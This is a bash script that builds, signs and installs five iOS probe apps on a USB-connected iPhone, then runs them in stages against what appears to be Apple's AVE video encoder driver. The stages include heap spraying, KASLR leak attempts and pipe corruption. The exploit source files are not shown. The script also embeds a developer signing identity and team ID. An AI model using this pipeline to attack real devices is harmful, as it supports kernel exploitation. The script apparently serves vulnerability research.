#!/bin/bash
# deploy_all.sh — Build, sign, and deploy all AVE research probes
#
# Usage: ./deploy_all.sh [udid]
#   If udid not provided, auto-detects first connected iPhone Duo
#
# Prerequisites:
#   - Xcode command line tools
#   - pymobiledevice3 installed
#   - Developer signing identity available
#   - Device connected via USB

set -e

RESEARCH_DIR="$HOME/a20_research"
IDENTITY="Apple Development: Travis Tameirao (7TJQC38PMP)"
TEAM_ID="9QP5427NJJ"

cd "$RESEARCH_DIR"

# Auto-detect UDID if not provided
if [ -n "$1" ]; then
    UDID="$1"
else
    echo "[*] Auto-detecting iPhone Duo..."
    UDID=$(python3 -c "
from pymobiledevice3.usbmux import list_devices
for d in list_devices():
    from pymobiledevice3.lockdown import LockdownClient
    try:
        c = LockdownClient(d)
        name = c.get_value(key='DeviceName')
        hw = c.get_value(key='HardwareModel')
        if 'Duo' in str(name) or 'A20' in str(hw) or 'iPhone18' in str(c.get_value(key='ProductType')):
            print(d.serial)
            break
    except: pass
" 2>/dev/null)
    if [ -z "$UDID" ]; then
        echo "[!] No iPhone Duo found. Trying first available device..."
        UDID=$(pymobiledevice3 usbmux list --usb 2>/dev/null | grep -o '"serial": "[^"]*"' | head -1 | cut -d'"' -f4)
    fi
fi

if [ -z "$UDID" ]; then
    echo "[!] No device found. Connect via USB and retry."
    exit 1
fi
echo "[*] Target device: $UDID"

# Probe definitions: source_file bundle_id app_name
PROBES=(
    "ave_dma_surgical.c:com.research.avesurgical:AVESurgical"
    "ave_pixeldata_probe.c:com.research.avepixel:AVEPixel"
    "ave_exploit_probe.c:com.research.aveexploit:AVEExploit"
    "ave_pipe_probe.c:com.research.avepipe:AVEPipe"
    "ave_kaslr_leak.c:com.research.avekaslr:AVEKaslr"
)

build_and_deploy() {
    local src="$1" bundle="$2" appname="$3"
    local binary="${src%.c}"

    if [ ! -f "$src" ]; then
        echo "  [!] Source not found: $src — skipping"
        return 1
    fi

    echo "  [*] Compiling $src..."
    xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0 \
        -framework VideoToolbox -framework CoreVideo -framework CoreMedia \
        -framework CoreFoundation -framework IOSurface -framework IOKit \
        -o "$binary" "$src" -Wno-deprecated-declarations 2>&1

    echo "  [*] Packaging $appname.app..."
    rm -rf "$appname.app"
    mkdir -p "$appname.app"
    cp "$binary" "$appname.app/$appname"

    cat > "$appname.app/Info.plist" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>$appname</string>
    <key>CFBundleIdentifier</key>
    <string>$bundle</string>
    <key>CFBundleName</key>
    <string>$appname</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>MinimumOSVersion</key>
    <string>17.0</string>
    <key>CFBundleSupportedPlatforms</key>
    <array><string>iPhoneOS</string></array>
    <key>UIDeviceFamily</key>
    <array><integer>1</integer></array>
    <key>UIFileSharingEnabled</key>
    <true/>
    <key>UISupportsDocumentBrowser</key>
    <true/>
</dict>
</plist>
PLIST

    local ent="${appname}.entitlements"
    cat > "$ent" << ENT
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>application-identifier</key>
    <string>$TEAM_ID.$bundle</string>
    <key>com.apple.developer.team-identifier</key>
    <string>$TEAM_ID</string>
    <key>get-task-allow</key>
    <true/>
</dict>
</plist>
ENT

    echo "  [*] Signing with: $IDENTITY"
    codesign -f -s "$IDENTITY" --entitlements "$ent" "$appname.app" 2>&1

    echo "  [*] Installing on device $UDID..."
    pymobiledevice3 apps install --udid "$UDID" "$appname.app" 2>&1

    echo "  [+] $appname deployed successfully"
    return 0
}

echo ""
echo "========================================="
echo "  AVE Research Probe Deployment"
echo "========================================="
echo ""

DEPLOYED=0
FAILED=0

for probe in "${PROBES[@]}"; do
    IFS=':' read -r src bundle appname <<< "$probe"
    echo "[*] Building $appname ($bundle)..."
    if build_and_deploy "$src" "$bundle" "$appname"; then
        ((DEPLOYED++))
    else
        ((FAILED++))
    fi
    echo ""
done

echo "========================================="
echo "  Results: $DEPLOYED deployed, $FAILED failed"
echo "========================================="

echo ""
echo "[*] Running test sequence..."
echo ""

run_probe() {
    local bundle="$1" mode="$2" appname="$3" wait="$4"
    echo "  [>] $appname mode=$mode"
    pymobiledevice3 developer dvt launch "$bundle $mode" --udid "$UDID" 2>&1 || true
    sleep "${wait:-5}"
}

echo "[Phase 1] Safe baseline tests"
run_probe "com.research.avesurgical" "info" "AVESurgical" 3
run_probe "com.research.avesurgical" "spray_check" "AVESurgical" 5

echo "[Phase 2] Pixel data probe (CORRECT HEAP — page pool)"
run_probe "com.research.avepixel" "baseline" "AVEPixel" 5
run_probe "com.research.avepixel" "pixel_ntl9" "AVEPixel" 8
run_probe "com.research.avepixel" "multi_round" "AVEPixel" 60

echo "[Phase 3] Legacy probes (wrong heap, kept for comparison)"
run_probe "com.research.avesurgical" "spray_ntl9" "AVESurgical" 8

echo "[Phase 4] KASLR leak attempts"
run_probe "com.research.avekaslr" "spray_leak" "AVEKaslr" 8

echo "[Phase 5] Pipe corruption"
run_probe "com.research.avepipe" "pipe_spray" "AVEPipe" 5
run_probe "com.research.avepipe" "pipe_ntl9" "AVEPipe" 10

echo ""
echo "[*] Test sequence complete."
echo "[*] Pull results with:"
echo "    pymobiledevice3 apps afc --udid $UDID --documents <bundle_id>"
echo ""
echo "[*] Available bundles:"
for probe in "${PROBES[@]}"; do
    IFS=':' read -r src bundle appname <<< "$probe"
    echo "    $bundle"
done
